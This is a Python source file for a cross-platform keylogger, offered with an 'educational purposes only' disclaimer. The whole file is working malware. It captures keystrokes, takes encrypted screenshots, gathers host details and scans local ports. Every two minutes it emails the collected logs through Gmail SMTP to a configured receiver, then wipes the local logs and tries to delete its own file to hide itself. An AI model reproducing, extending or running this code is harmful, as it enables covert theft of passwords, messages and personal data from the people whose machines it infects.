'''
:project: Python Keylogger for WINDOWS / LINUX
:coded by: Karthik Nalinakshan

NOTE: OUR TOOLS ARE FOR EDUCATIONAL PURPOSES ONLY. DON'T USE THEM FOR ILLEGAL ACTIVITIES. 
      YOU ARE THE ONLY RESPONSABLE FOR YOUR ACTIONS! OUR TOOLS ARE OPEN SOURCE WITH NO WARRANTY AND AS ARE.
'''

try:
  import logging
  import socket
  import platform
  import threading
  import subprocess
  import os
  import time
  import psutil
  import pyscreenshot
  import smtplib
  import multiprocessing

  from pynput.keyboard import Key, Listener
  from random import randint
  from PIL import ImageGrab
  from email.mime.base import MIMEBase
  import config
  from email.mime.multipart import MIMEMultipart
  from email.mime.text import MIMEText
  from email import encoders
  from cryptography.fernet import Fernet
except ModuleNotFoundError:
  modules = ['pyscreenshot', 'smtplib', 'PIL', 'pynput', 'psutil']
  subprocess.call('pip install' + ' '.join(modules), shell=True)

class KeyLog():

  def __init__(self):
    self.LOGS_FILE_DIRECTORY = self.createDir()  
    self.WORKING_OS = platform.system()   # DEFINING OS

    # FILES
    self.sys_info = os.path.join(os.path.abspath(self.LOGS_FILE_DIRECTORY), 'systeminfo.txt')
    self.log_file = os.path.join(os.path.abspath(self.LOGS_FILE_DIRECTORY), 'keylog.txt')
    self.clean_data = os.path.join(os.path.abspath(self.LOGS_FILE_DIRECTORY), 'clean-text.txt')
    self.key_for_encryptDecrypt = os.path.join(os.path.abspath(self.LOGS_FILE_DIRECTORY), 'KeyValue.key')
    
    # GENERATING ENCRYPTION KEY
    self.ENCRYPTION_KEY = self.createKey()
    self.writeKey(self.ENCRYPTION_KEY, self.key_for_encryptDecrypt)
    self.KEY_VALUE =  self.loadKey(self.key_for_encryptDecrypt)
    self.list_of_files = os.listdir(os.path.join(os.getcwd(), self.LOGS_FILE_DIRECTORY))

    # KEYSTROKE LOGGING CONFIG
    logging.basicConfig(filename = (self.log_file), level = logging.DEBUG, format = '%(asctime)s: %(message)s')
          
  # CLASS VARIABLES
  REPORT_TIME = 120
  count = 0
  unsorted_data = []
  FROM_ADDR = config.SENDER_EMAIL_ADDR
  TO_ADDR = config.RECEIVER_EMAIL_ADDR  

  # Create New Dir
  def createDir(self):
    newfile = os.path.join(os.getcwd(), str(randint(1111, 9999)) + "logs")
    os.mkdir(newfile, 0o775)
    return newfile

  # KEY CREATION
  def createKey(self):
    cryptKey = Fernet.generate_key()
    return cryptKey

  # WRITING KEY TO A FILE
  def writeKey(self, cryptKey, key_stored_file):
    with open(key_stored_file, 'wb') as keyFile:
      keyFile.write(cryptKey)

  # RETRIEVING KEY 
  def loadKey(self, key_stored_file):
    with open(key_stored_file, 'rb') as keyFile:
      cryptKey = keyFile.read()
    return cryptKey

  # ENCRYPTING FILE
  def encryptFile(self, cryptKey, file_to_be_encrypted, encrypted_file):
    f = Fernet(cryptKey)
    with open(file_to_be_encrypted, 'rb') as current_file:
      before_encryption = current_file.read()        
    encrypted = f.encrypt(before_encryption)
    with open(encrypted_file, 'wb') as current_file:
      current_file.write(encrypted)

  # DECRYPTING FILE
  def decryptFile(self, key, file_to_be_decrypted):
    f = Fernet(key)
    try:
      for de_file in file_to_be_decrypted:
        if de_file.find('.key') == -1:
          with open((os.path.join(os.path.abspath(self.LOGS_FILE_DIRECTORY), de_file)), 'rb') as decrypt_file:
            before_decryption = decrypt_file.read()
          try:   
            decrypted = f.decrypt(before_decryption)
            with open((os.path.join(os.path.abspath(self.LOGS_FILE_DIRECTORY), de_file)), 'wb') as decrypt_file:
              decrypt_file.write(decrypted)
          except Exception:
            pass
        else:
          pass
    except Exception:
      pass
  
  # FUNCTION CHECKS FOR OPEN PORTS IN THE SYSTEM
  def check_open_port(self, host, port):
    s = socket.socket()
    try:
      s.connect((host, port))
      s.settimeout(1)
    except:
      return False
    else:
        return True

  # CAPTURE SCREENSHOT
  def screenshotWinMacLin(self, file_loc):
    SAVE_SCREENSHOT = os.path.join(file_loc, (f'{randint(1,999999999)}screen.png'))
    if self.WORKING_OS == "Windows":
      image = ImageGrab.grab(all_screens = True)
      image.save(SAVE_SCREENSHOT, 'PNG')
    else:
      try:    
        captureScreen = pyscreenshot.grab()
        captureScreen.save(SAVE_SCREENSHOT, 'PNG')
      except Exception:
        pass
    self.encryptFile(self.KEY_VALUE, SAVE_SCREENSHOT, SAVE_SCREENSHOT)
  
  # COMPUTER INFORMATION
  def log_computerInfo(self):
    with open(self.sys_info, "a+") as sysfile:
      hostname = socket.gethostname()
      IPAddress = socket.gethostbyname(hostname)
      # try:
      #   public_IPAddr = get("https://api.ipify.org").text
      #   sysfile.write("Public IP Address: " + public_IPAddr)
      # except Exception:
      #   pass
      try:
        sysfile.write("\nProcessor: " + (platform.processor()) + '\n')
        platform_OS = platform.system()
        sysfile.write("System: " + platform_OS + ' ' + platform.version() + '\n')
        sysfile.write("Machine: " + platform.machine() + '\n')
        sysfile.write("Hostname: " + hostname + '\n')
        sysfile.write("Private IP Address: " + IPAddress + '\n')
        # host = socket.gethostbyname(socket.gethostname())
        for port in range(1, 1025):
            if self.check_open_port(IPAddress, port):
              sysfile.write(f"[+] {IPAddress}:{port} is open \r")
            else:
              sysfile.write("")
      except Exception:
        pass
      sysfile.close()
    self.encryptFile(self.KEY_VALUE, self.sys_info, self.sys_info)

  # SENDING MAIL TO VIEWER
  def send_recorded_logs(self, fromaddr, toaddr, filesList):
    fromaddr = config.SENDER_EMAIL_ADDR
    toaddr = config.RECEIVER_EMAIL_ADDR

    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = 'This is the subject of my email'

    body = "Attached logs recorded"
    msg.attach(MIMEText(body, 'plain'))

    self.decryptFile(self.KEY_VALUE, self.list_of_files)
    time.sleep(5)
    files_to_be_attached = filesList  
    for filename in files_to_be_attached:
      if filename.find('.key') == -1:
        filename = os.path.join(os.path.abspath(self.LOGS_FILE_DIRECTORY), filename)
        attachment = open(filename, 'rb')
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header("Content-Disposition", f"attachment; filename = {filename}")
        msg.attach(part)
      else:
        pass
    msg = msg.as_string()

    try:
      server = smtplib.SMTP('smtp.gmail.com', 587)
      server.ehlo()
      server.starttls()
      server.login(fromaddr, config.SENDER_PASS)          
      server.sendmail(fromaddr, toaddr, msg)
      server.quit()
      print("Email Sent Successfully")
    except Exception as e:
      print("[-] Something went wrong! ...", e)
  
  # DELETE ALL RECORDS
  def deleteAllFiles(self):
    path = os.path.abspath(self.LOGS_FILE_DIRECTORY)
    try:
      for file_ in self.list_of_files:
        os.remove(os.path.join(path, file_))
    except OSError:
      pass

  # CHECKING PROCESS STATUS
  def processWorkingOrNot(self, filename_of_process):
    for i in psutil.process_iter():
      if i.name() == filename_of_process:
        newVal = 222
        break
      else:
        newVal = 999
        continue       
    return newVal

  # TIMER FOR SENDING LOGS
  def sendLogsAt(self):
    self.log_computerInfo()
    self.screenshotWinMacLin(os.path.abspath(self.LOGS_FILE_DIRECTORY))
    self.list_of_files = os.listdir(os.path.abspath(self.LOGS_FILE_DIRECTORY))
    if self.list_of_files:
      self.send_recorded_logs(self.FROM_ADDR, self.TO_ADDR, self.list_of_files)
      time.sleep(5)
      self.deleteAllFiles()
    else:
      pass
    setTimer = threading.Timer(self.REPORT_TIME, self.sendLogsAt)
    setTimer.start()
  
  # RECORD KEYSTROKES
  def on_press(self, key):
    with open (self.log_file, 'a+') as f:
        f.write(f'{time.asctime}: {key}\n')    
    self.count += 1
    try:
        if key == Key.space:
            self.unsorted_data.append(' ')
        elif key == Key.enter:
            self.unsorted_data.append('\n')
        elif key == Key.backspace:
            self.unsorted_data = self.unsorted_data[:-1]
        elif key == [Key.alt and Key.tab]:
            pass
        elif key == Key.tab:
            self.unsorted_data.append('\t')
        elif str(key).find('Key.') == -1:
            self.unsorted_data.append(key)
    except Exception :
        pass

    if self.count >= 30:
      self.write_file(self.unsorted_data)
      self.unsorted_data = []
      self.count = 0    

  # CHAR KEYSTROKES SAVED TO ANOTHER FILE
  def write_file(self, write_data):
    with open(self.clean_data, "a+") as clean_file:
      for key in write_data:
        try:
          clean_key = str(key).replace("'", "")
          clean_file.write(clean_key)
        except Exception:
          pass    
      clean_file.close()    
  
  def mainModule(self):
    key_listener = Listener(on_press = self.on_press )
    with key_listener:
      try:
        # SENDING LOGS
        self.list_of_files = os.listdir(os.path.abspath(self.LOGS_FILE_DIRECTORY))
        self.sendLogsAt()
      except Exception as e:
        print("[-] Oops Error -- ", e)  
      key_listener.join()   # LISTENING TO KEYSTROKES
      
    # CHECKING KEYLOGGER IS RUNNING ELSE DELETING THE FILE.
    if self.WORKING_OS == 'Windows':
      name_of_running_file = os.path.basename(__file__)
      procW = self.processWorkingOrNot(name_of_running_file)
      if procW == 999:
        try:
          self.deleteAllFiles()
          os.removedirs(self.LOGS_FILE_DIRECTORY)
          os.system("DEL " + os.path.basename(__file__))
        except Exception:
          pass
    elif self.WORKING_OS == 'Linux':
      try:
        name_of_running_file = os.path.splitext(__file__)[0]
        procL = self.processWorkingOrNot(name_of_running_file)
        if procL == 999:            
          try:
            self.deleteAllFiles()
            os.removedirs(self.LOGS_FILE_DIRECTORY)
            os.system("rm -rf" + os.path.basename(__file__))
          except Exception:
            pass
        else:
          pass
      except Exception:
        pass

if __name__ == '__main__':
  multiprocessing.freeze_support() # For pyinstaller (Not related to keylogger)
  keylogClass = KeyLog()
  keylogClass.mainModule()